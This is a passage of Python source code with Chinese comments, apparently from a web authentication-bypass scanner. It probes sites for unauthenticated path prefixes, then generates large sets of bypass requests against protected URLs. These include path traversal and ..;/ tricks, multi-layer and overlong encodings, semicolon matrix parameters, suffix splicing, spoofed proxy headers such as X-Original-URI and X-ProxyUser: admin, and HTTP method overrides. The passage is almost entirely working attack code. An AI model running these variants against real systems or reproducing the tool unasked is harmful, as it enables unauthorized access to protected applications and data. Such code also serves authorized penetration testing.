                    "rtt": round(time.monotonic() - start, 3), "error": err,
                    "sent_url": sent_url, "rewritten": sent_url != url,
                }
        except asyncio.TimeoutError:
            return _err_resp(url, "timeout", self.timeout)
        except aiohttp.ClientError as e:
            return _err_resp(url, type(e).__name__, round(time.monotonic() - start, 3))
        except Exception as e:
            return _err_resp(url, f"{type(e).__name__}:{e}", round(time.monotonic() - start, 3))

    async def send(self, url, method="GET", extra_headers=None, kind="low",
                   body=None, retries=0):
        headers = self._get_headers(kind)
        if extra_headers:
            headers.update(extra_headers)

        async def guarded():
            # [修复#11] 每次尝试独立占用信号量：重试等待期间不再持有
            # 并发额度，避免多数协程重试时并发度塌缩为 0
            await self.limiter.acquire()
            try:
                return await self._send_once(url, method, headers, body)
            finally:
                self.limiter.release()

        r = await guarded()
        attempt = 0
        # 瞬时错误重试（阶段一探测防漏报用）
        while r["error"] and r["error"] not in ("http_429",) and attempt < retries:
            attempt += 1
            await asyncio.sleep(0.3)
            r = await guarded()
        return r

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()


# ---------------------------------------------------------------------------
# 阶段一：免鉴权白名单前缀探测（匿名 404 指纹法）
# 原理：鉴权 Filter 先于路由执行——白名单前缀下的随机垃圾路径被放行后
# 由路由层返回 404/405/400/410；非白名单前缀下的同样路径被 Filter 拦截
# 返回 401/403/跳登录。先以根级垃圾路径校验站点确有全局鉴权。
# ---------------------------------------------------------------------------
def target_contexts(url):
    """[D3 修复] 目标路径全部祖先目录 + 根。
    /app/admin/user/list → ['', 'app', 'app/admin', 'app/admin/user']
    （v3.4 仅探测根 + 首段两级，漏掉中间层级白名单）"""
    p = urlparse(url).path or "/"
    segs = [s for s in p.split("/") if s]
    if not segs:
        return [""]
    out = [""]
    acc = ""
    ancestors = segs[:-1] if len(segs) > 1 else segs[:0]
    for s in ancestors:
        acc = f"{acc}/{s}" if acc else s
        out.append(acc)
    if len(segs) == 1:
        out.append(segs[0])
    return out


def collect_candidates(extra):
    cands = {}
    for group, items in CANDIDATE_GROUPS.items():
        for it in items:
            n = norm_seg(it)
            if n and n not in cands:
                cands[n] = f"字典/{group}"
    for e in extra:
        n = norm_seg(e)
        if n and n not in cands:
            cands[n] = "手工注入"
    return cands


async def collect_robots(manager, base):
    r = await manager.send(base + "/robots.txt", "GET", kind="anon", retries=1)
    if r["error"] or r["code"] != 200 or "text" not in (r["ctype"] or ""):
        return []
    out = []
    for m in ROBOTS_DISALLOW_RE.finditer(r["body"] or ""):
        segs = [s for s in m.group(1).split("?")[0].split("/") if s and s != "*"]
        if not segs:
            continue
        out.append("/".join(segs[:2]))
        out.append(segs[0])
    return out


async def collect_sitemap(manager, base):
    r = await manager.send(base + "/sitemap.xml", "GET", kind="anon", retries=1)
    if r["error"] or r["code"] != 200 or "xml" not in (r["ctype"] or ""):
        return []
    out = []
    for m in SITEMAP_LOC_RE.finditer(r["body"] or ""):
        try:
            segs = [s for s in urlparse(urljoin(base, m.group(1))).path.split("/") if s]
        except Exception:
            continue
        if segs:
            out.append("/".join(segs[:2]))
            out.append(segs[0])
    return out


async def collect_html_paths(manager, page_url, cap=150):
    r = await manager.send(page_url, "GET", kind="anon", retries=1)
    if r["error"] or r["code"] not in (200, 301, 302, 401, 403):
        return []
    # [修复#15] 去重 + 上限：富文本大页的内联链接不再无限填充候选集
    out, seen = [], set()
    for m in HTML_PATH_RE.finditer(r["body"] or ""):
        u = m.group(1)
        if u.startswith(("javascript:", "data:", "mailto:", "tel:", "//", "http")):
            continue
        segs = [s for s in urlparse(u).path.split("/") if s]
        if segs:
            for cand in ("/".join(segs[:2]), segs[0]):
                if cand not in seen:
                    seen.add(cand)
                    out.append(cand)
            if len(seen) >= cap:
                break
    return out


def classify(root_denied, junk, prefix_root):
    """[D2/D6 修复] 单候选判定，返回 (置信度, 信号, 证据) 或 None。
    D2: 200 + 登录页正文（SPA 未登录首页）显式排除，不再误判为白名单。
    D6: 非登录 302（WAF 挑战/CDN 跳转）升级为"中置信·跳转待查"。"""
    if junk["error"]:
        return None
    denied = junk["code"] in DENY_CODES or is_login_redirect(junk["location"])
    if denied:
        return None
    body = junk["body"] or ""
    loginish = bool(body) and bool(LOGIN_PAGE_RE.search(body[:512]))
    routed = junk["code"] in ROUTED_CODES
    ok = junk["code"] in OK_CODES

    if root_denied:
        if routed:
            ev = f"垃圾路径 HTTP {junk['code']}"
            if prefix_root and prefix_root["code"] in OK_CODES:
                ev += f"；前缀根 HTTP {prefix_root['code']}"
            return ("高", "强信号(路由穿透)", ev)
        if ok and not loginish:
            return ("中", "疑似穿透", f"垃圾路径 HTTP {junk['code']} 且非登录内容（泛解析需人工确认）")
        if ok and loginish:
            return None  # [D2] 200 登录页正文 → 排除
        if junk["code"] in REDIRECT_CODES and junk["location"]:
            return ("中", "跳转待查",
                    f"HTTP {junk['code']} → {junk['location'][:60]}（非登录跳转，人工确认）")
        return None

    # 站点无全局鉴权 → 弱信号降级
    if prefix_root and prefix_root["code"] in OK_CODES \
            and not is_login_redirect(prefix_root["location"]) \
            and not LOGIN_PAGE_RE.search((prefix_root["body"] or "")[:512]):
        return ("低", "弱信号(前缀根匿名可达)",
                f"前缀根 HTTP {prefix_root['code']} ({(prefix_root['ctype'] or '')[:30]})")
    if routed:
        return ("低", "弱信号(路由可达)", f"垃圾路径 HTTP {junk['code']}")
    return None


async def probe_candidate(manager, base, ctx, cand, source, root_denied, junk):
    is_file = "." in cand.rsplit("/", 1)[-1]
    if is_file:
        r = await manager.send(build_url(base, ctx, cand), "GET", kind="anon")
        if r["error"] or r["code"] != 200:
            return None
        conf = "高" if root_denied else "低"
        return {"前缀": cand, "上下文": ctx or "/", "来源": source,
                "信号": "文件级匿名可达", "置信度": conf,
                "证据": f"GET {cand} → 200 ({(r['ctype'] or '')[:30]}, len={r['length']})",
                "备注": ""}
    jr = await manager.send(build_url(base, ctx, f"{cand}/{junk}"), "GET", kind="anon")
    if jr["error"]:
        return None
    root_r = None
    if jr["code"] in (ROUTED_CODES | OK_CODES) or is_login_redirect(jr["location"]) \
            or jr["code"] in DENY_CODES:
        root_r = await manager.send(build_url(base, ctx, cand) + "/", "GET", kind="anon")
    hit = classify(root_denied, jr, root_r)
    if not hit:
        return None
    conf, signal, ev = hit
    return {"前缀": cand, "上下文": ctx or "/", "来源": source,
            "信号": signal, "置信度": conf, "证据": ev, "备注": ""}


async def boundary_checks(manager, base, ctx, cand, probe_tag="authz_probe_"):
    """白名单实现缺陷边界检测。
    [D7 修复] 大小写检测在首字符 swapcase 之外增加全大写/首字母大写。"""
    notes = []
    junk = probe_tag + os.urandom(4).hex()
    seg = cand.split("/")[0]
    r = await manager.send(build_url(base, ctx, f"{seg}x9z/{junk}"), "GET", kind="anon")
    if not r["error"] and r["code"] in ROUTED_CODES:
        notes.append(f"前缀匹配疑似 startsWith（/{seg}x9z 同样穿透 → HTTP {r['code']}）")
    seen_sw = set()
    for sw in (seg.upper(), seg[0].swapcase() + seg[1:], seg.capitalize()):
        if sw == seg or sw in seen_sw:
            continue
        seen_sw.add(sw)
        r2 = await manager.send(build_url(base, ctx, f"{sw}/{junk}"), "GET", kind="anon")
        if not r2["error"] and r2["code"] in ROUTED_CODES:
            notes.append(f"大小写不敏感（/{sw} 同样穿透 → HTTP {r2['code']}）")
    return notes


def full_path_of(r):
    ctx = r["上下文"].strip("/")
    return f"/{ctx}/{r['前缀']}" if ctx else f"/{r['前缀']}"


async def probe_target(idx, total, target, manager, args, out_base):
    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"

    print("\n" + "=" * 78)
    print(f" [{idx}/{total}] 阶段一：白名单前缀探测  {target}")
    print("=" * 78)

    junk_root = args.probe_tag + os.urandom(5).hex()
    root_probe = await manager.send(f"{base}/{junk_root}", "GET", kind="anon", retries=1)
    if root_probe["error"]:
        print(f"[-] 站点根探测失败（{root_probe['error']}），跳过白名单探测")
        return {"target": target, "ok": False, "reason": root_probe["error"], "found": []}
    root_denied = root_probe["code"] in DENY_CODES or is_login_redirect(root_probe["location"])
    print(f"[*] 根级指纹: HTTP {root_probe['code']}"
          + (f" → {root_probe['location'][:50]}" if root_probe["location"] else "")
          + ("  [全局鉴权确认，强信号]" if root_denied else "  [未确认全局鉴权，弱信号]"))

    extra = [e for chunk in (args.extra_candidate or []) for e in chunk.split(",")]
    cands = collect_candidates(extra)
    for src, collect in (("robots.txt", collect_robots), ("sitemap.xml", collect_sitemap)):
        for p in await collect(manager, base):
            n = norm_seg(p)
            if n and n not in cands:
                cands[n] = src
    for p in await collect_html_paths(manager, target):
        n = norm_seg(p)
        if n and n not in cands:
            cands[n] = "页面引用"

    ctxs = target_contexts(target)
    print(f"[*] 候选 {len(cands)} 个 × 上下文 {ctxs}")

    junk = args.probe_tag + os.urandom(5).hex()
    results = []

    async def one(ctx, cand, source):
        r = await probe_candidate(manager, base, ctx, cand, source, root_denied, junk)
        if r:
            results.append(r)

    tasks = [(ctx, cand, src) for ctx in ctxs for cand, src in cands.items()]
    CHUNK = 200
    rep = ProgressReporter(prefix="    ")
    for i in range(0, len(tasks), CHUNK):
        await asyncio.gather(*(one(*t) for t in tasks[i:i + CHUNK]))
        rep.update(min(i + CHUNK, len(tasks)), len(tasks), stars=len(results))
    rep.finish(f"候选探测完成 {len(tasks)} 项，命中 {len(results)}")

    if not results:
        print("[-] 未发现免鉴权白名单前缀")
        return {"target": target, "ok": True, "root_denied": root_denied, "found": []}

    merged = defaultdict(list)
    for r in results:
        merged[r["前缀"]].append(r)
    final = []
    for prefix, rows in merged.items():
        main = max(rows, key=lambda x: ("高中低".index(x["置信度"])
                                        if x["置信度"] in "高中低" else -1))
        if len(rows) > 1:
            # [修复#14] 聚合各上下文证据而非丢弃：不同上下文的状态码差异
            # 本身是复核线索（如一处 404 另一处 405）
            others = [r for r in rows if r is not main]
            ev = "；".join(f"[/{r['上下文'].strip('/')}] {r['证据']}"
                          for r in others[:3])
            main["备注"] += f"；另命中 {len(others)} 处: {ev}" \
                           + (f" 等" if len(others) > 3 else "")
        final.append(main)
    for r in final[:15]:
        notes = await boundary_checks(manager, base, r["上下文"].rstrip("/"),
                                      r["前缀"], probe_tag=args.probe_tag)
        if notes:
            r["备注"] += ("；" if r["备注"] else "") + "；".join(notes)

    rank = {"高": 0, "中": 1, "低": 2}
    final.sort(key=lambda x: (rank.get(x["置信度"], 9), x["前缀"]))

    print(f"[+] 发现 {len(final)} 个免鉴权前缀：")
    print(f"  {pad('完整路径', 30)}{pad('置信度', 8)}{pad('信号', 22)}来源")
    print("  " + "-" * 74)
    for r in final:
        print(f"  {pad(full_path_of(r), 30)}{pad(r['置信度'], 8)}{pad(r['信号'], 22)}{r['来源']}")
    for r in final:
        if r["备注"]:
            print(f"  ⚠ {full_path_of(r)}: {r['备注'].strip('；')}")

    pf = f"{out_base}_{idx:02d}_prefixes"
    with open(pf + ".csv", "w", encoding="utf-8-sig", newline="") as f:
        w = csv.DictWriter(f, fieldnames=["前缀", "上下文", "来源", "信号", "置信度", "证据", "备注"])
        w.writeheader()
        w.writerows(final)
    return {"target": target, "ok": True, "root_denied": root_denied,
            "found": final, "report": pf}


# ---------------------------------------------------------------------------
# 阶段二：变形生成（借道前缀 / 目录穿越 / 分号穿越 / 编码解码 / 路径拼接）
# ---------------------------------------------------------------------------
def build(cat, desc, raw, ctx, method="GET", headers=None, keep_query=True,
          body=None, follow=False):
    if not raw.startswith(("http", "/")):
        raw = "/" + raw  # 防拼出 host:port%2f... 型非法 URL
    full = raw if raw.startswith("http") else \
        ctx["origin"] + raw + (f"?{ctx['query']}" if (ctx["query"] and keep_query) else "")
    return {"cat": cat, "desc": desc, "url": full, "raw": raw, "method": method,
            "headers": headers or {}, "body": body, "follow": follow}


class DetourPlugin:
    """借道前缀：免鉴权白名单前缀 × 编码穿越形态 全积生成。
    [D4 修复] 前缀优先级：实测(高/中置信) > 手工注入 > 内置字典。
    实测/手工前缀无条件全形态覆盖（数量有限、真实有效，是核心弹药）；
    内置前缀按"经典形态优先覆盖全部前缀"的顺序在 prefix_cap 预算内展开。
    v3.4 中内置清单排在前、截断时实测前缀先被裁的顺序问题就此消除。"""
    category = "借道前缀"

    def generate(self, ctx):
        op = ctx["orig_path"]
        sj = "/".join(ctx["segs"])
        hi_list, lo_list, seen = [], [], set()
        for p in list(ctx.get("hi_prefixes") or []):
            p = norm_seg(p)
            if p and p not in seen:
                seen.add(p)
                hi_list.append(p)
        for p in BUILTIN_DETOUR_PREFIXES:
            p = norm_seg(p)
            if p and p not in seen:
                seen.add(p)
                lo_list.append(p)
        out = []
        for p in hi_list:
            for desc, enc, sep in DETOUR_FORMS:
                out.append(build(self.category, f"/{p} {desc}",
                                 f"/{p}{enc}" + (sj if sep else op), ctx))
        budget = max(0, (ctx["prefix_cap"] if ctx.get("prefix_cap") is not None else 150)
                     - len(out))
        n = 0
        for desc, enc, sep in DETOUR_FORMS:
            for p in lo_list:
                if n >= budget:
                    return out
                out.append(build(self.category, f"/{p} {desc}",
                                 f"/{p}{enc}" + (sj if sep else op), ctx))
                n += 1
        return out


class TraversalPlugin:
    """目录穿越：../ 族编码形态，挂哑前缀 /x/ 测试鉴权层与路由层
    对穿越的规范化差异。"""
    category = "目录穿越"

    def generate(self, ctx):
        c = ctx
        op, segs = c["orig_path"], c["segs"]
        sj = "/".join(segs)
        V = lambda d, raw: build(self.category, d, raw, c)
        return [
            V("字面 /x/../", "/x/.." + op),
            V("%2e%2e", "/x/%2e%2e" + op),
            V("大写 %2E%2E", "/x/%2E%2E" + op),
            V("..%2f", "/x/..%2f" + sj),
            V("%2e%2e%2f", "/x/%2e%2e%2f" + sj),
            V("%2e%2e%5c 编码反斜杠", "/x/%2e%2e%5c" + sj),
            V("双重编码 %252e%252e", "/x/%252e%252e" + op),
            V("混合 ..%252f", "/x/..%252f" + sj),
            V("双写 ....// 绕过滤器", "/x/....//" + sj),
            V("混合点 %2e./", "/x/%2e./" + sj),
            V("混合点2 .%2e/", "/x/.%2e/" + sj),
            V("超长UTF-8 %c0%ae%c0%ae", "/x/%c0%ae%c0%ae%c0%af" + sj),
            V("UTF-8 overlong %e0%80%af", "/x/%e0%80%ae%e0%80%af" + sj),
            V("三重编码 %25252e", "/x/%25252e%25252e" + op),
            V("字面反斜杠 /x/..\\", "/x/..\\" + "\\".join(segs)),
            V("全角点号 ．．", "/x/．．/" + sj),
            V("双重编码全路径", "/" + "".join(pct_encode_char(s, double=True) for s in op[1:])),
        ]


class SemicolonTraversalPlugin:
    """..;/ 穿越：分号段（Tomcat/部分网关在路由匹配前裁剪 ; 后内容，
    鉴权层看到的路径与路由层实际解析的路径不一致）"""
    category = "..;/穿越"

    def generate(self, ctx):
        c = ctx
        op, first, rest = c["orig_path"], c["first"], c["rest"]
        sj = "/".join(c["segs"])
        V = lambda d, raw: build(self.category, d, raw, c)
        return [
            V("/x/..;/ + 原路径", "/x/..;" + op),
            V("首段后 ..;/", f"/{first}/..;/{rest}" if rest else "/x/..;" + op),
            V("..; 编码形式 /%2e%2e;/", "/x/%2e%2e;" + op),
            V("..;/ 双重组合", "/x/..;/..;" + op),
            V("..;/ 三重组合", "/x/..;/..;/..;" + op),
            V("..;/ 四层组合", "/x/..;/..;/..;/..;" + op),
            V("..; 反斜杠组合", "/x/..;\\..;" + op),
            V("末段 ..;/ 穿越", op + "/..;/"),
            V("字面+编码混合 /x/..%3b/", "/x/..%3b" + op),
            V("编码分号+编码斜杠 /x/..%3b%2f", "/x/..%3b%2f" + sj),
            V("双写穿越 ....;//", "/x/....;//" + sj),
        ]


class EncodingPlugin:
    """编码解码：分隔符/点号在不同层被解码一次/两次/多次的差异。
    检查容器是否在路由前解码、安全层看原始 URL 而业务层看解码后路径。"""
    category = "编码解码"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail = c["orig_path"], c["first"], c["rest"], c["tail_rest"]
        segs = c["segs"]
        V = lambda d, raw: build(self.category, d, raw, c)
        variants = []
        if first:
            enc = pct_encode_char(first[0]) + first[1:]
            dbl = pct_encode_char(first[0], double=True) + first[1:]
            variants += [
                V("首字母 URL 编码", "/" + enc + tail),
                V("首字母双重编码", "/" + dbl + tail),
                V("首段全编码", "/" + pct_encode(first) + tail),
                V("首段双重编码", "/" + pct_encode(first, double=True) + tail),
            ]
        variants += [
            V("编码斜杠分隔 %2f", "/" + "%2f".join(segs)),
            V("编码斜杠大写 %2F", "/" + "%2F".join(segs)),
            V("双重编码分隔 %252f", "/" + "%252f".join(segs)),
            V("三重编码分隔 %25252f", "/" + "%25252f".join(segs)),
            V("大小写混合 %2F%2f", "/" + "%2F%2f".join(segs)),
            V("编码点号前缀 /%2e", "/%2e" + op),
            V("编码点号双重 /%252e", "/%252e" + op),
            V("非规范UTF-8 斜杠 %c0%af", "/" + "%c0%af".join(segs)),
            V("非规范UTF-8 点号 %c0%ae", "/" + "%c0%ae".join(segs)),
            V("非规范UTF-8 %e0%80%af", "/" + "%e0%80%af".join(segs)),
            V("容错编码 %u002f (IIS)", "/" + "%u002f".join(segs)),
            V("编码反斜杠分隔 %5c", "/" + "%5c".join(segs)),
            V("全角斜杠分隔 ／", "/" + "／".join(segs)),
        ]
        if rest:
            variants.append(V("末段全编码", "/" + "/".join(segs[:-1]) + "/" + pct_encode(segs[-1])))
        return variants


class SplicePlugin:
    """路径拼接：斜杠差异 / 点段归一化 / 后缀拼接 / 结构拼接 / 尾缀追加。
    检查鉴权规则只匹配"目录名"或"字面前缀"而非真实解析路径的情况。"""
    category = "路径拼接"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail, segs = c["orig_path"], c["first"], c["rest"], c["tail_rest"], c["segs"]
        sj = "/".join(segs)
        V = lambda d, raw: build(self.category, d, raw, c)
        variants = [
            # 斜杠差异
            V("尾斜杠", op + "/"),
            V("尾部双斜杠", op + "//"),
            V("双斜杠开头", "/" + op),
            V("三斜杠开头", "//" + op),
            V("中间双斜杠", f"/{first}//{rest}" if rest else op + "//"),
            V("中段三斜杠", f"/{first}///{rest}" if rest else op + "///"),
            # 点段归一化
            V("/./ 当前目录", f"/{first}/./{rest}" if rest else "/./" + first),
            V("/./ 前缀全路径", "/./" + sj),
            V("编码点目录 /%2e/", "/%2e/" + sj),
            V("自消解 /a/../a/", f"/{first}/../{first}/{rest}" if rest else f"/{first}/../{first}"),
            V("自消解变体 /a/x/../", f"/{first}/x/../{rest}" if rest else f"/{first}/x/../{first}"),
            V("尾部 /.", op + "/."),
            V("尾部 /..", op + "/.."),
            V("连续点段 /././", "/././" + sj),
            # 后缀拼接
            V("尾部点号", op + "."),
            V("尾部多点号 ...", op + "..."),
        ]
        for suf in (".json", ".html", ".css", ".js", ".ico", ".svg", ".txt",
                    ".bak", ".do", ".action", ".jsp", ".jsonp"):
            variants.append(V(f"追加后缀 {suf}", op + suf))
        variants += [
            V("斜杠+伪后缀 /.json", op + "/.json"),
            V("分号伪后缀 ;.json", op + ";.json"),
            V("编码点后缀 %2ejson", op + "%2ejson"),
            V("伪静态 /x.css", op + "/x.css"),
            V("编码问号伪静态 %3f.css", op + "%3f.css"),
            # 结构拼接
            V("尾部斜杠后分号 /;", op + "/;"),
            V("尾部单独分号 ;", op + ";"),
            V("追加无关片段 /x", op + "/x"),
            V("追加无关片段 /x/y", op + "/x/y"),
            V("追加空格段 /%20", op + "/%20"),
            V("追加 /;/", op + "/;/"),
            V("追加 /./", op + "/./"),
        ]
        if rest:
            variants += [
                V("访问父路径", "/" + "/".join(segs[:-1])),
                V("首段重复双写", f"/{first}/{first}/{rest}"),
                V("末段重复双写", op + "/" + segs[-1]),
            ]
        if len(segs) > 2:
            variants.append(V("访问祖父路径", "/" + "/".join(segs[:-2])))
        for sub in ("index", "list", "default"):
            variants.append(V(f"追加默认段 /{sub}", op + f"/{sub}"))
        return variants


class SemicolonPlugin:
    """分号参数（矩阵参数）：安全层裁剪分号后内容 vs 路由层保留原文的差异面"""
    category = "分号参数"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail, segs = c["orig_path"], c["first"], c["rest"], c["tail_rest"], c["segs"]
        V = lambda d, raw: build(self.category, d, raw, c)
        return [
            V("首段后插 ;foo=bar", f"/{first};foo=bar{tail}" if rest else op + ";foo=bar"),
            V("首段后插 ;jsessionid", f"/{first};jsessionid=AAAA{tail}" if rest else op + ";jsessionid=AAAA"),
            V("末段追加 ;jsessionid", op + ";jsessionid=AAAA"),
            V("末段追加 ;a=1", op + ";a=1"),
            V("中间段插 ;a=1", "/" + "/".join(s + ";a=1" for s in segs)),
            V("尾部单独分号 ;", op + ";"),
            V("编码分号 %3b", op + "%3ba=1"),
            V("大写编码分号 %3B", op + "%3Ba=1"),
            V("双重编码分号 %253b", op + "%253ba=1"),
            V("/;/ 前缀形式", "/;/" + "/".join(segs)),
            V("/.;/ 点分号前缀", "/.;/" + "/".join(segs)),
            V("/%3b/ 编码分号前缀", "/%3b/" + "/".join(segs)),
            V("路径前导矩阵参数 ;a=1/", ";a=1/" + "/".join(segs)),
            V("每段前置 ;a=1", "/" + "/".join(";a=1" + s for s in segs)),
            V("双分号矩阵参数 ;;a=1", op + ";;a=1"),
            V("编码等号矩阵参数 ;a%3d1", op + ";a%3d1"),
            V("参数值含编码斜杠 ;x=%2f", op + ";x=%2f"),
            V("参数值含编码点号 ;x=%2e%2e", op + ";x=%2e%2e"),
            V("分号+空段包裹 /;/…;/", "/;/" + "/".join(segs) + ";/"),
        ]


class URLDecodeJumpPlugin:
    """[v4.2] 多次解码时机差异：鉴权层与路由层 decode 次数错位，
    %25252525 在单次解码层看仍是编码串（判安全），双解码层看是 %2525…
    %ud800 代理对与 %fe%ff UTF-16 BOM 可令解码层异常跳过规范化。"""
    category = "URL解码跳跃"

    def generate(self, ctx):
        op, segs = ctx["orig_path"], ctx["segs"]
        V = lambda d, raw: build(self.category, d, raw, ctx)
        return [
            V("四重编码分隔 %25252525", "/" + "%25252525".join(segs)),
            V("混合双重 %252f%2f", "/" + "%252f%2f".join(segs)),
            V("四重编码点 %25252e%25252e", "/%25252e%25252e" + op),
            V("Unicode代理对 %ud800%udc00", "/" + "%ud800%udc00".join(segs)),
            V("UTF-16 BE前缀 %fe%ff", "/%fe%ff" + op),
        ]


class HeaderInjectionPlugin:
    """[v4.2] 反代路径头注入：nginx/traefik 常以 X-Original-URI 等
    头向内层应用传递真实路径，若内层信任该头即可覆盖路由结果。
    X-Rewrite-URL 用目标原始路径（建议稿硬编码 /admin 已修正）。"""
    category = "头部注入"

    def generate(self, ctx):
        op = ctx["orig_path"]
        V = lambda d, **kw: build(self.category, d, op, ctx, **kw)
        return [
            V("X-Original-URI 覆盖", headers={"X-Original-URI": op}),
            V("X-Rewrite-URL 覆盖", headers={"X-Rewrite-URL": op}),
            V("X-Forwarded 链伪造", headers={"X-Forwarded-For": "127.0.0.1",
                                             "X-Forwarded-Host": "internal"}),
            V("X-ProxyUser 冒充", headers={"X-ProxyUser": "admin"}),
            V("X-Real-IP 内网伪造", headers={"X-Real-IP": "127.0.0.1"}),
        ]


class ContentNegotiationPlugin:
    """[v4.2] 内容协商：Accept/Accept-Encoding/X-Requested-With 影响
    路由分支与鉴权逻辑（移动端宽松鉴权、压缩层检测失效、AJAX 白名单）。
    默认请求头已是 Accept: */*，故不再重复生成该变形（建议稿冗余项已剔除）。"""
    category = "内容协商"

    def generate(self, ctx):
        op = ctx["orig_path"]
        V = lambda d, **kw: build(self.category, d, op, ctx, **kw)
        return [
            V("Accept: application/json", headers={"Accept": "application/json"}),
            V("Accept: text/plain", headers={"Accept": "text/plain"}),
            V("Accept: text/html", headers={"Accept": "text/html"}),
            V("Accept-Encoding: identity", headers={"Accept-Encoding": "identity"}),
            V("Accept-Language 简中", headers={"Accept-Language": "zh-CN,zh;q=0.9"}),
            V("X-Requested-With AJAX", headers={"X-Requested-With": "XMLHttpRequest"}),
        ]


class MethodPlugin:
    """HTTP 方法覆盖（--probe-method 显式开启）：方法级鉴权一致性检查"""
    category = "HTTP方法"
    require_flag = "probe_method"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = lambda d, raw, **kw: build(self.category, d, raw, c, **kw)
        variants = []
        for m in ("POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"):
            variants.append(V(f"改用 {m}", op, method=m))
        for h in ("X-HTTP-Method-Override", "X-Original-Method", "X-HTTP-Method",
                  "X-Method-Override", "HTTP-Method-Override"):
            variants.append(V(f"POST + {h}: GET", op, method="POST", headers={h: "GET"}))
        variants.append(V("POST + body _method=GET", op, method="POST",
                          headers={"Content-Type": "application/x-www-form-urlencoded"},
                          body="_method=GET"))
        variants.append(V("POST + body _method=DELETE", op, method="POST",
                          headers={"Content-Type": "application/x-www-form-urlencoded"},
                          body="_method=DELETE"))
        return variants


PLUGIN_REGISTRY = [
    DetourPlugin,
    TraversalPlugin,
    SemicolonTraversalPlugin,
    EncodingPlugin,
    SplicePlugin,
    SemicolonPlugin,
    URLDecodeJumpPlugin,
    HeaderInjectionPlugin,
    ContentNegotiationPlugin,
    MethodPlugin,
]

COMBINE_CATEGORIES = ("借道前缀", "目录穿越", "..;/穿越", "编码解码", "路径拼接", "分号参数")


def combine_variants(variants, ctx, cap=200, per_cat=4):
    """双因子组合：前缀型变形（在原路径外包裹前缀）× 后缀型变形（原路径后追加尾部）。
    实战中双因子组合命中率显著高于单因子。"""
    orig = ctx["orig_path"]
    pre_pool, suf_pool = defaultdict(list), defaultdict(list)
    for v in variants:
        if v["method"] != "GET" or v["headers"] or v.get("body"):
            continue
        if v["cat"] not in COMBINE_CATEGORIES:
            continue
        raw = v["raw"]
        if raw.endswith(orig) and raw != orig:
            pre_pool[v["cat"]].append(v)
        # [修复#4] 后缀池要求 orig 后紧跟边界字符（/.;%）或空，
        # 防止 orig 出现在中间段时被误分类为纯尾部追加
        elif raw.startswith(orig) and len(raw) > len(orig) \
                and raw[len(orig)] in "/.;%":
            suf_pool[v["cat"]].append(v)
    ppool = [v for vs in pre_pool.values() for v in vs[:per_cat]]
    spool = [v for vs in suf_pool.values() for v in vs[:per_cat]]
    out = []
    for pv in ppool:
        for sv in spool:
            if len(out) >= cap:
                return out
            extra = sv["raw"][len(orig):]
            out.append(build("组合变形", f"{pv['desc']} × {sv['desc']}",
                             pv["raw"] + extra, ctx))
    return out


def round_robin_slice(variants, cap):
    """按类别轮转截取，避免上限截断系统性丢弃后排类别"""
    if not cap or len(variants) <= cap:
        return variants
    buckets = {}
    for v in variants:
        buckets.setdefault(v["cat"], []).append(v)
    out, idx = [], 0
    while len(out) < cap:
        added = False
        for bucket in buckets.values():
            if idx < len(bucket) and len(out) < cap:
                out.append(bucket[idx])
                added = True
        if not added:
            break
        idx += 1
    return out


def generate_variants(url, categories=None, hi_prefixes=None, probe_method=False,
                      combine=False, combine_cap=200, prefix_cap=150):
    origin, segs, query = split_path(url)
    if not segs:
        segs = [""]
    ctx = {
        "origin": origin, "segs": segs, "query": query,
        "orig_path": "/" + "/".join(segs),
        "first": segs[0],
        "rest": "/".join(segs[1:]) if len(segs) > 1 else "",
        "tail_rest": ("/" + "/".join(segs[1:])) if len(segs) > 1 else "",
        "hi_prefixes": list(hi_prefixes or []),
        "prefix_cap": prefix_cap,
    }
    cat_filter = None
    if categories:
        cat_filter = set()
        for c in categories.split(","):
            c = c.strip()
            if c in CATEGORY_MAP:
                cat_filter.add(CATEGORY_MAP[c])
            else:
                cat_filter.add(c)
        if "HTTP方法" in cat_filter:
            probe_method = True
        if "借道前缀" not in cat_filter and cat_filter:
            pass  # 显式筛选时保留用户意图

    variants, seen = [], set()

    def add(v):
        key = (v["method"], v["url"], tuple(sorted(v["headers"].items())), v.get("body"))
        if key not in seen:
            seen.add(key)
            variants.append(v)

    flags = {"probe_method": probe_method}
    for plugin_cls in PLUGIN_REGISTRY:
        flag = getattr(plugin_cls, "require_flag", "")
        if flag and not flags.get(flag):
            continue
        plugin = plugin_cls()
        if cat_filter and plugin.category not in cat_filter:
            continue
        for v in plugin.generate(ctx):
            add(v)

    if combine and (not cat_filter or "组合变形" in cat_filter or len(cat_filter) > 1):
        for v in combine_variants(variants, ctx, cap=combine_cap):
            add(v)
    return variants


# ---------------------------------------------------------------------------
# 基线建立（自适应采样）
# ---------------------------------------------------------------------------
async def get_baseline_adaptive(target, manager, kind, label, max_samples=5):
    """前 2 次相似度 >= 0.98 即稳定返回，否则追加采样（最多 5 次），
    不稳定时取中位数代表并告警。"""
    samples, rtts = [], []
    for i in range(max_samples):
        r = await manager.send(target, "GET", kind=kind)
        if r["error"]:
            print(f"    {label}: 请求失败({r['error']})，后续判定可能不准")
            return r, False, [], rtts
        samples.append(r)
        rtts.append(r["rtt"])
        if len(samples) >= 2:
            # [修复#6] 与 evaluate 判定统一使用 content_similarity：
            # 原 similarity(fingerprint) 保留标签+title 提权，语义不一致
            min_sim = min(content_similarity(samples[i]["body"], samples[i]["ctype"],
                                             samples[j]["body"], samples[j]["ctype"])
                          for i in range(len(samples)) for j in range(i + 1, len(samples)))
            if min_sim >= 0.98:
                print(f"    {label}: HTTP {r['code']}, 长度 {r['length']} (采样 {len(samples)} 次即稳定)")
                return r, True, samples, rtts
    samples_sorted = sorted(samples, key=lambda s: s["length"])
    median = samples_sorted[len(samples_sorted) // 2]
    print(f"    {label}: HTTP {median['code']}, 长度 {median['length']}"
          f"  ⚠ {max_samples}次采样内容不一致，相似度判定可能不准")
    return median, False, samples, rtts


async def get_error_baseline(origin, manager):
    """请求随机不存在路径两次，拿稳定错误页指纹（用于排除伪 2xx）"""
    bogus = f"{origin}/wb-nope-{int(time.time())}{random.randint(1000, 9999)}"
    r1 = await manager.send(bogus, "GET", kind="low")
    if r1["error"]:
